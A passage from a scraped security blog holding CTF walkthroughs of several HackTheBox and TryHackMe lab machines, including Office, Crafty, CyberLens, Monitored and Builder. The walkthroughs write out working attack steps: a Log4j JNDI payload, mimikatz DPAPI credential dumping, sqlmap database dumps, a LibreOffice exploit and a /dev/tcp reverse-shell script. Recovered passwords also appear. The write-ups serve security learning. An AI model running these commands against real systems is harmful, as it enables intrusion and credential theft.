S-1-5-11 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group\rOFFICE\\Registry Editors Group S-1-5-21-1199398058-4196589450-691661856-1106 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group\rMandatory Label\\Medium Mandatory Level Label S-1-16-8192 It seems that tstark is in OFFICE\\Registry Editors which means, this user can make changes to registry. Nothing interesting found in tstark user\u0026rsquo;s directory, so I went back to xampp. There are 3 folders.\nThere is nothing in administrator folder. We have already seen joomla website. There is an internal folder where it seems another website is hosted.\nAlso, while enumerating C:\\Program Files\\ I found LibreOffice 5 is installed.\nOkay, enough of enumeration, We will now visit the internal file. We have to find the port number of that application and then using chisel, we will do port forwarding so that we can able to view website from our machine.\nFrom C:\\xampp\\apache\\conf\\httpd.conf we can able to see the port number of the application. That is 8083.\nInstall Chisel from it\u0026rsquo;s release page. Transfer windows file to windows machine and we will now try to connect it.\nOn Windows Machine\r.\\chisel_1.9.1_windows_amd64 client 10.10.14.152:8000 R:8083:127.0.0.1:8083\rOn Linux Machine\r./chisel_1.9.1_linux_amd64 server --port 8001 --reverse Now visiting 127.0.0.1:8083 will give us the internal website. In the website, there is a page to upload the resume where I tried to upload png file, it gave me this error Accepted File Types : Doc, Docx, Docm, Odt!.\nOn searching for Libre Office 5 exploit, I found this one CVE-2023-2255\nUse this command in order to generate the file python3 CVE-2023-2255.py --cmd \u0026quot;cmd /c \u0026lt;rev_shell_base64_payload\u0026gt;, now upload the file to in place of resume and wait for sometime to get the shell.\nAnd yes, we got the shell as ppotts.\nShell as HHogan Checking vaultcmd /list gave us this results.\nWhereas system level creds are stored in C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Credentials. It gave us 3 files. Moreover, we can also see protected files at this location C:\\users\\ppotts\\appdata\\Roaming\\Microsoft\\Protect\\S-1-5-21-1199398058-4196589450-691661856-1107.\nGetting the key .\\mimikatz.exe \u0026quot;dpapi::masterkey /in:C:\\users\\ppotts\\appdata\\roaming\\microsoft\\protect\\S-1-5-21-1199398058-4196589450-691661856-1107\\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc\u0026quot; exit\nThis is the key - 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166\nNow trying masterkey on each of the file, and this is the one which gave us the password - .\\mimikatz.exe \u0026quot;dpapi::cred /in:C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Credentials\\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166\u0026quot; exit\nUserName : OFFICE\\HHogan\rCredentialBlob : H4ppyFtW183# Administrator We can get shell using evil-winrm - evil-winrm -i office.htb -u hhogan -p 'H4ppyFtW183#'\nOn checking whoami /all we noticed that it is a member of GPO Managers group.\nThere are multiple GPOs.\n*Evil-WinRM* PS C:\\Users\\HHogan\\Documents\u0026gt; Get-GPO -All | Select-Object DisplayName\rDisplayName\r-----------\rWindows Firewall GPO\rDefault Domain Policy\rDefault Active Directory Settings GPO\rDefault Domain Controllers Policy\rWindows Update GPO\rWindows Update Domain Policy\rSoftware Installation GPO\rPassword Policy GPO In order to edit GPO, we can download the binary from here.\nTrying with different GPOs eventually give us admin access to HHogan user. In order to make it effective, we have to reload GPOs using gpupdate /force. Also, we have to reconnect in get it.\nAfter reconnecting, we can able to get the flag.\n1 2 *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; cat root.txt e4641807a5835f83cc6381d15af788ae Credentials Service User Password SMB dwolfe H0lOgrams4reTakIng0Ver754! tstark playboy69 Joomla Admin Administrator playboy69 HHogan H4ppyFtW183# ","description":"Office is a hard-difficulty Windows machine featuring various vulnerabilities including Joomla web application abuse, PCAP analysis to identify Kerberos credentials, abusing LibreOffice macros after disabling the `MacroSecurityLevel` registry value, abusing MSKRP to dump DPAPI credentials and abusing Group Policies due to excessive Active Directory privileges.","id":14,"section":"posts","tags":["HackTheBox","CVE-2023-2255","CVE-2023-23752","Joomla","Kerbrute","Wireshark","Libreoffice","dpapi","mimikatz","GPO","Chisel"],"title":"HackTheBox Writeup - Office Room","uri":"https://g4nd1v.github.io/posts/hackthebox-office/"},{"content":"Crafty Title Crafty Description HTB Windows Easy Machine Difficulty Easy Maker TheCyberGeek \u0026amp; felamos Enumeration Starting with Nmap,\n└─$ nmap -sC -sV -oA nmap/crafty 10.10.11.249\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 07:28 EDT\rNmap scan report for 10.10.11.249\rHost is up (0.11s latency).\rNot shown: 999 filtered tcp ports (no-response)\rPORT STATE SERVICE VERSION\r80/tcp open http Microsoft IIS httpd 10.0\r|_http-server-header: Microsoft-IIS/10.0\r|_http-title: Did not follow redirect to http://crafty.htb\rService Info: OS: Windows; CPE: cpe:/o:microsoft:windows Add crafty.htb to /etc/hosts. On visiting website, we found another domain - play.crafty.htb add that to hosts as well. I have tried to find subdomains using ffuf but didn\u0026rsquo;t found any.\nAs I am clueless now, I have decided to run full nmap scan for all the ports.\n└─$ nmap -sC -sV -p- -oA nmap/crafty 10.10.11.249\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 07:29 EDT\rStats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan\rConnect Scan Timing: About 2.83% done; ETC: 07:35 (0:06:18 remaining)\rNmap scan report for 10.10.11.249\rHost is up (0.081s latency).\rNot shown: 65533 filtered tcp ports (no-response)\rPORT STATE SERVICE VERSION\r80/tcp open http Microsoft IIS httpd 10.0\r|_http-title: Did not follow redirect to http://crafty.htb\r|_http-server-header: Microsoft-IIS/10.0\r25565/tcp open minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)\rService Info: OS: Windows; CPE: cpe:/o:microsoft:windows See, we have another port open that we missed earlier. Port 25565 which is Minecraft 1.16.5. We can download Minecraft client from here https://github.com/MCCTeam/Minecraft-Console-Client/releases.\n└─$ ./MinecraftClient-20240415-263-linux-x64 --help\rMinecraft Console Client v1.20.4 - for MC 1.4.6 to 1.20.4 - Github.com/MCCTeam\rGitHub build 263, built on 2024-04-15 from commit 403284c\rCommand-Line Help:\rMinecraftClient.exe \u0026lt;username\u0026gt; \u0026lt;password\u0026gt; \u0026lt;server\u0026gt;\rMinecraftClient.exe \u0026lt;username\u0026gt; \u0026lt;password\u0026gt; \u0026lt;server\u0026gt; \u0026#34;/mycommand\u0026#34;\rMinecraftClient.exe --setting=value [--other settings]\rMinecraftClient.exe --section.setting=value [--other settings]\rMinecraftClient.exe \u0026lt;settings-file.ini\u0026gt; [--other settings] Joining server with username and password\n└─$ ./MinecraftClient-20240415-263-linux-x64 g4nd1v \u0026#39;\u0026#39; 10.10.11.249\rMinecraft Console Client v1.20.4 - for MC 1.4.6 to 1.20.4 - Github.com/MCCTeam\rGitHub build 263, built on 2024-04-15 from commit 403284c\rPassword(invisible):\rYou chose to run in offline mode.\rRetrieving Server Info...\rServer version : 1.16.5 (protocol v754)\r[MCC] Version is supported.\rLogging in...\r[MCC] Server is in offline mode.\r[MCC] Server was successfully joined.\rType \u0026#39;/quit\u0026#39; to leave the server.\r\u0026gt; User Flag Download Log4j POC from github - https://github.com/kozmer/log4j-shell-poc\nChange line 26 from String cmd=\u0026quot;/bin/sh\u0026quot;; to String cmd=\u0026quot;cmd.exe\u0026quot;; and run this command to start the POC script.\npython3 poc.py --userip 10.10.14.166 --webport 8000 --lport 9001 also start netcat listener on other tab - nc -lvnp 9001 and paste the generated ${jndi:ldap://10.10.14.29:1389}/a into Minecraft server.\n1 2 c:\\Users\\svc_minecraft\\Desktop\u0026gt;type user.txt 7285f344585dc116f9d03b900d275e05 Root Flag There is a playercounter-1.0-SNAPSHOT.jar file in c:\\Users\\svc_minecraft\\server\\plugins, so we will download the file and inspect if we can find anything interesting into it.\nIn order to transfer file, we will use smbserver from impacket - start smbserver with this command on our machine smbserver.py share . -smb2support and then copy the file.\ncopy playercounter-1.0-SNAPSHOT.jar \\\\10.10.14.166\\share\\\nBut, we cannot be able to copy because it is not allowed by the host. So we will use username and password to login.\n1. Use smbserver with username and password on attacker (our) machine\rsmbserver.py share . -smb2support -username g4nd1v -password g4nd1v\r2. allow share from host machine\rnet use \\\\10.10.14.166\\share /u:g4nd1v g4nd1v\r3. Now send the file\rcopy playercounter-1.0-SNAPSHOT.jar \\\\10.10.14.166\\share\\ Perfect, now we got the file, we will use online java decompiler to perform our task - https://jdec.app/\nHere, in the Playercounter.class there is a hardcoded password s67u84zKq8IXw. Maybe of Administrator? Let\u0026rsquo;s check.\nTransfer RunasCs from https://github.com/antonioCoco/RunasCs and then run it in our shell.\n1 2 3 4 5 c:\\Users\\svc_minecraft\\Desktop\u0026gt;RunasCs.exe Administrator s67u84zKq8IXw \u0026#34;cmd /c whoami\u0026#34; crafty\\administrator c:\\Users\\svc_minecraft\\Desktop\u0026gt;.\\RunasCs.exe Administrator s67u84zKq8IXw \u0026#34;cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt\u0026#34; 1ed2d80a98dec60ac1f21c1f5b981b2e ","description":"Detailed walkthrough of the Crafty room on HackTheBox platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.","id":15,"section":"posts","tags":["HackTheBox","Log4j","CVE-2021-44228"],"title":"HackTheBox Writeup - Crafty Room","uri":"https://g4nd1v.github.io/posts/hackthebox-crafty/"},{"content":"mkingdom Title CyberLens Description Can you exploit the CyberLens web server and discover the hidden flags? Difficulty Easy Maker TeneBrae93 and tgreenMWR Nmap [└─$ nmap -sC -sV -oA nmap/mkingdom 10.10.0.63\r# Nmap 7.94SVN scan initiated Tue Jun 18 11:40:55 2024 as: nmap -sC -sV -oA nmap/mkingdom 10.10.0.63\rNmap scan report for 10.10.0.63\rHost is up (0.10s latency).\rNot shown: 999 closed tcp ports (conn-refused)\rPORT STATE SERVICE VERSION\r85/tcp open http Apache httpd 2.4.7 ((Ubuntu))\r|_http-server-header: Apache/2.4.7 (Ubuntu)\r|_http-title: 0H N0! PWN3D 4G4IN](\u0026lt;└─$ cat nmap/cyberlens.nmap\r# Nmap 7.94SVN scan initiated Fri May 31 20:57:25 2024 as: nmap -sC -sV -oA nmap/cyberlens 10.10.94.45\rNmap scan report for 10.10.94.45\rHost is up (0.093s latency).\rNot shown: 995 closed tcp ports (conn-refused)\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.57 ((Win64))\r|_http-title: CyberLens: Unveiling the Hidden Matrix\r| http-methods:\r|_ Potentially risky methods: TRACE\r|_http-server-header: Apache/2.4.57 (Win64)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r445/tcp open microsoft-ds?\r3389/tcp open ms-wbt-server Microsoft Terminal Services\r|_ssl-date: 2024-06-01T00:58:10+00:00; +1s from scanner time.\r| rdp-ntlm-info:\r| Target_Name: CYBERLENS\r| NetBIOS_Domain_Name: CYBERLENS\r| NetBIOS_Computer_Name: CYBERLENS\r| DNS_Domain_Name: CyberLens\r| DNS_Computer_Name: CyberLens\r| Product_Version: 10.0.17763\r|_ System_Time: 2024-06-01T00:58:01+00:00\r| ssl-cert: Subject: commonName=CyberLens\r| Not valid before: 2024-05-31T00:52:22\r|_Not valid after: 2024-11-30T00:52:22\rService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r| smb2-security-mode:\r| 3:1:1:\r|_ Message signing enabled but not required\r| smb2-time:\r| date: 2024-06-01T00:58:03\r|_ start_date: N/A User Flag As there is smb service running, I tried login in with empty password, but I got \u0026ldquo;Access Denied\u0026rdquo;\n└─$ smbclient -L \\\\10.10.116.165\rPassword for [WORKGROUP\\kali]:\rsession setup failed: NT_STATUS_ACCESS_DENIED So, next thing I did was to visit homepage of the website and there is a upload file functionality in the website, and there is a button on side which says \u0026ldquo;Get Metadata\u0026rdquo;. So, I have uploaded sample jpeg image for testing.\nHere is the result from the uploaded file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 { \u0026#34;Component 1\u0026#34;: \u0026#34;Y component: Quantization table 0, Sampling factors 2 horiz/2 vert\u0026#34;, \u0026#34;Component 2\u0026#34;: \u0026#34;Cb component: Quantization table 1, Sampling factors 1 horiz/1 vert\u0026#34;, \u0026#34;Component 3\u0026#34;: \u0026#34;Cr component: Quantization table 1, Sampling factors 1 horiz/1 vert\u0026#34;, \u0026#34;Compression Type\u0026#34;: \u0026#34;Baseline\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;image/jpeg\u0026#34;, \u0026#34;Data Precision\u0026#34;: \u0026#34;8 bits\u0026#34;, \u0026#34;File Modified Date\u0026#34;: \u0026#34;Thu Jun 20 01:46:46 +00:00 2024\u0026#34;, \u0026#34;File Name\u0026#34;: \u0026#34;apache-tika-12826399836580280142.tmp\u0026#34;, \u0026#34;File Size\u0026#34;: \u0026#34;27437 bytes\u0026#34;, \u0026#34;Image Height\u0026#34;: \u0026#34;460 pixels\u0026#34;, \u0026#34;Image Width\u0026#34;: \u0026#34;460 pixels\u0026#34;, \u0026#34;Number of Components\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;Number of Tables\u0026#34;: \u0026#34;4 Huffman tables\u0026#34;, \u0026#34;X-Parsed-By\u0026#34;: [ \u0026#34;org.apache.tika.parser.DefaultParser\u0026#34;, \u0026#34;org.apache.tika.parser.jpeg.JpegParser\u0026#34; ], \u0026#34;language\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;tiff:BitsPerSample\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;tiff:ImageLength\u0026#34;: \u0026#34;460\u0026#34;, \u0026#34;tiff:ImageWidth\u0026#34;: \u0026#34;460\u0026#34; } The file is been parsed, as we can see X-Parsed-By by org.apache.tika.parser.DefaultParser and org.apache.tika.parser.jpeg.JpegParser and quick googling gave us CVE-2018-1335 (More about CVE - https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/)\nAlso in the source code, it is sending PUT request to http://cyberlens.thm:61777/meta\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;script\u0026gt; document.addEventListener(\u0026#34;DOMContentLoaded\u0026#34;, function() { document.getElementById(\u0026#34;metadataButton\u0026#34;).addEventListener(\u0026#34;click\u0026#34;, function() { var fileInput = document.getElementById(\u0026#34;imageFileInput\u0026#34;); var file = fileInput.files[0]; var reader = new FileReader(); reader.onload = function() { var fileData = reader.result; fetch(\u0026#34;http://cyberlens.thm:61777/meta\u0026#34;, { method: \u0026#34;PUT\u0026#34;, body: fileData, headers: { \u0026#34;Accept\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/octet-stream\u0026#34; } }) .then(response =\u0026gt; { if (response.ok) { return response.json(); } else { throw new Error(\u0026#34;Error: \u0026#34; + response.status); } }) .then(data =\u0026gt; { var metadataOutput = document.getElementById(\u0026#34;metadataOutput\u0026#34;); metadataOutput.innerText = JSON.stringify(data, null, 2); }) .catch(error =\u0026gt; { console.error(\u0026#34;Error:\u0026#34;, error); }); }; reader.readAsArrayBuffer(file); }); }); \u0026lt;/script\u0026gt; I have searched this exploit in Metasploit and luckily they have one.\nmsf6 \u0026gt; search apache tika\rMatching Modules\r================\r# Name Disclosure Date Rank Check Description\r- ---- --------------- ---- ----- -----------\r0 exploit/windows/http/apache_tika_jp2_jscript 2018-04-25 excellent Yes Apache Tika Header Command Injection\rmsf6 \u0026gt; use 0 Here are options\nNow, run this exploit,\nC:\\Users\\CyberLens\\Desktop\u0026gt;type user.txt\rTHM{T1k4-CV3-f0r-7h3-w1n} Root Flag There is a text file in management folder, it says\nC:\\Users\\CyberLens\u0026gt;type Documents\\Management\\CyberLens-Management.txt\rRemember, manual enumeration is often key in an engagement ;)\rCyberLens\rHackSmarter123 But, I dont think this file is that useful, now moving the shell to background using background. Now, use use post/multi/recon/local_exploit_suggester to find local exploit. It seems, there are multiple exploit.\nThis is definitely vulnerable -exploit/windows/local/always_install_elevated: The target is vulnerable.\nSetting the options,\nRunning the exploit,\nC:\\Users\\Administrator\\Desktop\u0026gt;type admin.txt\rTHM{3lev@t3D-4-pr1v35c!} ","description":"Detailed walkthrough of the mKingdom room on TryHackMe platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.","id":16,"section":"posts","tags":["TryHackMe","CVE-2018-1335","Metasploit"],"title":"TryHackMe Writeup - CyberLens Room","uri":"https://g4nd1v.github.io/posts/tryhackme-cyberlens/"},{"content":" Title Monitored Description Monitored is HackTheBox Medium Linux Based Machine. Difficulty Medium Maker TheCyberGeek and ruycr4ft Nmap TCP Scan\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 └─$ nmap -sC -sV -oA nmap/monitered 10.129.239.185 [1/76] # Nmap 7.94SVN scan initiated Sun Jan 14 19:57:43 2024 as: nmap -sC -sV -oA nmap/monitered 10.129.239.185 Nmap scan report for 10.129.239.185 Host is up (0.087s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0) | ssh-hostkey: | 3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA) | 256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA) |_ 256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519) 80/tcp open http Apache httpd 2.4.56 |_http-title: Did not follow redirect to https://nagios.monitored.htb/ |_http-server-header: Apache/2.4.56 (Debian) 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X 443/tcp open ssl/http Apache httpd 2.4.56 ((Debian)) |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.56 (Debian) |_http-title: Nagios XI | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK | Not valid before: 2023-11-11T21:46:55 |_Not valid after: 2297-08-25T21:46:55 Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . UDP Scan\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 └─$ sudo nmap -sU --min-rate 10000 10.10.11.248 [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-21 00:09 EDT Nmap scan report for monitored.htb (10.10.11.248) Host is up (0.012s latency). Not shown: 992 open|filtered udp ports (no-response) PORT STATE SERVICE 21/udp closed ftp 123/udp open ntp 161/udp open snmp 631/udp closed ipp 19039/udp closed unknown 19933/udp closed unknown 21354/udp closed unknown 55544/udp closed unknown Firstly, I have added IP in /etc/hosts associated with monitored.htb and nagios.monitored.htb — On visiting website at nagios.monitored.htb it seems we have a login page, I have tried basic SQL injection attacks in this portal, but it is of no use.\nI have searched for nagios on google, and found there are multiple vulnerabilities on this software, I sorted the exploits by latest date and then found that, it will require username and password. I tried to find that from other ports in TCP but no luck.\nI tried to move my testing to UDP ports, in UDP there are 2 ports that are open. One of them is snmp. So using snmpwalk I have begin my pentesting. I have tried with smnpwalk and found that there are number of strings to look, therefore I have used grep in order to find username, password or something interesting file.\nIt seems that it is using this command → sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB — from this we can conclude that svc is the user and XjH7VCehowpR1xZB might be it’s password. Next, I tried to login in the website. But it gave me this error → The specified user account has been disabled or does not exist. That means the username and password is correct, but the account is disabled.\nAfter researching about nagios I found that it is using API to authenticate and from the exploits before, it was also using APIs. Therefore, I googled API about it by searching error and learning how to authenticate in nagios. I found this link which is very helpful - https://support.nagios.com/forum/viewtopic.php?t=58783\nIt says, use this to authenticate → curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin\u0026amp;password=YOURPASS\u0026amp;valid_min=5'\nVoila, we got the token, simply using ?token=\u0026lt;TOKEN\u0026gt; in web will bypass the account restrictions. Like this — https://nagios.monitored.htb/nagiosxi/?token=fd8dd9d35d2feaf0b9f6444dd67a197d3d639de1\nUser Flag Now, as we are inside the website, we got user cookie, we can use CVEs which we found earlier.\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-40931\nhttps://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567\nCVE is all about SQL Injection, we can directly exploit it using sqlmap.\nsqlmap -u \u0026quot;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php\u0026quot; --data=\u0026quot;id=3\u0026amp;action=acknowledge_banner_message\u0026quot; --cookie \u0026quot;nagiosxi=eoas0cdgnqdpcmdn243jm2gson\u0026quot; --dbms=MySQL --level=1 --risk=1 -D nagiosxi -T xi_users --dump\nWe found password hashes from database.\n1 2 3 4 5 6 7 8 9 Database: nagiosxi Table: xi_users [2 entries] +---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+ | user_id | email | name | api_key | enabled | password | username | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket | last_edited_by | login_attempts | last_password_change | +---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+ | 1 | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1 | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0 | 1701931372 | 1 | 1701427555 | 0 | 0 | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0 | 5 | 0 | 1701427555 | | 2 | svc@monitored.htb | svc | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0 | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc | 1 | 1699724476 | 1 | 1699728200 | 1699634403 | 1716269191 | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1 | 9 | 1699697433 | +---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+ I have added this hashes in file, but I cannot be able to crack this hashes. Next thing I searched is is there any way I can login to user with api_key as it is provided in database.\nOn google different ways to login in nagios, I found this exploit, in which using createAdmin function, we got the hint of how to create admin user from just api key. We have to send the admin api key to this post request /nagiosxi/api/v1/system/user?apikey=\u0026lt;api_key\u0026gt; with this body username=g4nd1v\u0026amp;password=whoami\u0026amp;name=g4nd1v\u0026amp;email=whoami@test.com\u0026amp;auth_level=admin\nNow, we can login with our username and password, that is g4nd1v:whoami and boom we are logged in as admin. From the dashboard tab, go to configure → core config manager → commands → new command — add our rev shell over here, then save and apply configuration.\nAgain go to configure → core config manager → services → add new → select rev shell and then run command. Then boom, we got the shell.\n1 2 3 4 5 6 7 nagios@monitored:~$ ls ls cookie.txt user.txt nagios@monitored:~$ cat user.txt cat user.txt f37c90b5afd59a48ebf10fca1db7c7b6 Root Flag sudo -l gave a list of command we can execute as root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 nagios@monitored:~$ sudo -l sudo -l Matching Defaults entries for nagios on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User nagios may run the following commands on localhost: (root) NOPASSWD: /etc/init.d/nagios start (root) NOPASSWD: /etc/init.d/nagios stop (root) NOPASSWD: /etc/init.d/nagios restart (root) NOPASSWD: /etc/init.d/nagios reload (root) NOPASSWD: /etc/init.d/nagios status (root) NOPASSWD: /etc/init.d/nagios checkconfig (root) NOPASSWD: /etc/init.d/npcd start (root) NOPASSWD: /etc/init.d/npcd stop (root) NOPASSWD: /etc/init.d/npcd restart (root) NOPASSWD: /etc/init.d/npcd reload (root) NOPASSWD: /etc/init.d/npcd status (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php * (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php * (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php * (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh * (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh * (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh * One interesting script is /usr/local/nagiosxi/scripts/manage_services.sh which manages nagios, starts, stops, restart. I found this interesting also while checking the processes using ps -ef I found that the binary /usr/local/nagios/bin/nagios is also owned by nagios,\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 nagios@monitored:~$ cd /usr/local/nagios/bin nagios@monitored:/usr/local/nagios/bin$ mv nagios nagios.bk ----- \u0026lt;import this script using python\u0026gt; ---- #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.17/4444 0\u0026gt;\u0026amp;1 ---- \u0026lt;and replace with nagios\u0026gt; ---- nagios@monitored:/usr/local/nagios/bin$ chmod +x nagios nagios@monitored:/usr/local/nagios/bin$ sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios Start Reverse shell on port 4444 on new tab and boom, we will get the shell.\n1 2 root@monitored:/root# cat root.txt 12211c34944207f567ba8a6824e8a629 ","description":"Detailed walkthrough of the Monitored box on HackTheBox platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.","id":17,"section":"posts","tags":["HackTheBox","SNMP","nagios"],"title":"HackTheBox Writeup - Monitored Box","uri":"https://g4nd1v.github.io/posts/hackthebox-monitored/"},{"content":" Title Builder Description Builder is HackTheBox Medium Linux Based Machine. Difficulty Medium Maker polarbearer and amra13579 Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 └─$ nmap -sC -sV -oA nmap/builder 10.10.11.10 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 22:59 EDT Nmap scan report for 10.10.11.10 Host is up (0.055s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75🇩🇪4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 8080/tcp open http Jetty 10.0.18 | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Jetty(10.0.18) | http-robots.txt: 1 disallowed entry |_/ |_http-title: Dashboard [Jenkins] Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . So basically there are 2 ports that are open, that is, 22 and 8080\nUser Flag On port 8080 we have Jenkins service running and it’s version is 2.441\nFrom quick googling, I found that it has CVE-2024-23897 - https://www.exploit-db.com/exploits/51993 → we can able to read file on server.\nDownload this file and test it with /etc/passwd\nInterested in learning more about this vulnerability? Here → https://www.jenkins.io/security/advisory/2024-01-24/\nNow, in order to check environment variables, we can use /proc/self/environ file.\n1 2 3 4 \u0026gt; /proc/self/environ HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimentalJAVA_HOME=/opt/java/openjdkJENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementalsCOPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_refer ence_file.logPWD=/JENKINS_SLAVE_AGENT_PORT=50000JENKINS_VERSION=2.441HOME=/var/jenkins_homeLANG=C.UTF-8JENKINS_UC=https://updates.jenkins.ioSHLVL=0JENKINS_HOME=/var/jenkins_homeREF=/usr/share/jenkins/refPATH=/opt/java/openjdk/bin:/usr/l ocal/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin Now that we know the home directory, we can get the user flag.\n1 2 \u0026gt; /var/jenkins_home/user.txt 725ca98881930e7627e470c7e9855880 Root Flag Now, in order to enumerate more in the machine, we need to know what is the file structure of Junkins, that is why I have pulled Jenkins images from docker and navigate path in my local machine in order to gain understanding of different files and folders.\nFirstly, we have to run docker in one tab using sudo docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17 and then on 